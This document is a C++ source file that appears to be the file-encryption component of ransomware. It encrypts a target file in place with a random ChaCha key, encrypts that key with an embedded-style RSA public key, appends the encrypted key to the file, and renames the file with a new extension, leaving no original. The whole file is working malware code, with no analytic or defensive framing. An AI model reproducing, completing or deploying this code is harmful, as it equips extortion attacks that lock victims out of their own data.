#include "pch.h"
#include "Helper.h"

BOOL EncryptFileContent(std::wstring TargetFile, std::wstring FileExtension, CryptoPP::RSA::PublicKey& PublicKey)
{
	std::vector<uint8_t> fileContent;
	
	if (!ReadTargetFile(TargetFile, fileContent)) {
		return FALSE;
	}

	if (fileContent.empty()) { return TRUE; }

	CryptoPP::AutoSeededRandomPool  prng;
	CryptoPP::SecByteBlock key(32), iv(8);

	prng.GenerateBlock(key, key.size());
	prng.GenerateBlock(iv, iv.size());

	CryptoPP::ChaCha::Encryption enc;
	enc.SetKeyWithIV(key, key.size(), iv, iv.size());

	enc.ProcessData(fileContent.data(), fileContent.data(), fileContent.size());

	std::vector<uint8_t> KeyNonce;
	std::vector<uint8_t> KeyNonceEncrypted;
	KeyNonce.insert(KeyNonce.begin(), key.begin(), key.end());
	KeyNonce.insert(KeyNonce.end(), iv.begin(), iv.end());

	RSAEncryptData(KeyNonce, PublicKey, KeyNonceEncrypted);

	fileContent.insert(fileContent.end(), KeyNonceEncrypted.begin(), KeyNonceEncrypted.end());

	if (!WriteTargetFile(TargetFile, fileContent)) {
		return FALSE;
	}

	size_t lastindex = TargetFile.find_last_of(L".");
	std::wstring rawname = TargetFile.substr(0, lastindex);

	std::wstring TargetFileEncrypted = rawname + FileExtension;
	if (!MoveFileW(TargetFile.data(), TargetFileEncrypted.data())) {
		return FALSE;
	}

	return TRUE;
}

void RSAEncryptData(std::vector<uint8_t>& plainText, CryptoPP::RSA::PublicKey& PublicKey, std::vector<uint8_t>& cipherText)
{
	CryptoPP::RSAES_OAEP_SHA256_Encryptor RSAEncryptor(PublicKey);
	CryptoPP::AutoSeededRandomPool prng;
	CryptoPP::VectorSource(plainText, true, new CryptoPP::PK_EncryptorFilter(prng, RSAEncryptor, new CryptoPP::VectorSink(cipherText)));
}

BOOL ReadTargetFile(std::wstring TargetFile, std::vector<uint8_t>& FileContent)
{
	HANDLE hFile;
	DWORD dwBytesRead = 0;
	DWORD dwFileSize = 0;
	OVERLAPPED ol = { 0 };

	hFile = CreateFileW(TargetFile.data(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[-] CreateFileW failed.\n");
		return FALSE;
	}

	dwFileSize = GetFileSize(hFile, NULL);
	if (dwFileSize == 0) {
		printf("[-] GetFileSize failed.\n");
		CloseHandle(hFile);
		return FALSE;
	}

	FileContent.resize(dwFileSize);

	if (!ReadFileEx(hFile, FileContent.data(), dwFileSize, &ol, NULL)) {
		return FALSE;
	}

	CloseHandle(hFile);
	return TRUE;
}

BOOL WriteTargetFile(std::wstring TargetFile, std::vector<uint8_t>& FileContent)
{
	HANDLE hFile;
	DWORD dwBytesWritten = 0;
	OVERLAPPED ol = { 0 };

	hFile = CreateFileW(TargetFile.data(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[-] CreateFileW failed.\n");
		return FALSE;
	}

	if (!WriteFile(hFile, FileContent.data(), FileContent.size(), &dwBytesWritten, NULL)) {
		printf("[-] WriteFile failed.\n");
		return FALSE;
	}

	CloseHandle(hFile);
	return TRUE;
}

BOOL SetTargetFile(std::wstring& TargetFile)
{
	std::wstring commandline = GetCommandLineW();
	if (!commandline.data()) {
		printf("[-] GetCommandLineW failed: %d\n", GetLastError());
		return FALSE;
	}

	int argc = 0;
	LPWSTR* argv;

	argv = CommandLineToArgvW(commandline.data(), &argc);

	if (argc != 2) {
		return FALSE;
	}

	TargetFile = argv[1];
	return TRUE;
}

void LoadKey(std::vector<uint8_t>& PubKeyBytes, CryptoPP::RSA::PublicKey& PubKey) {
	CryptoPP::ByteQueue queue;
	CryptoPP::VectorSource RSA(PubKeyBytes, true);
	RSA.TransferTo(queue);
	queue.MessageEnd();
	PubKey.Load(queue);
}
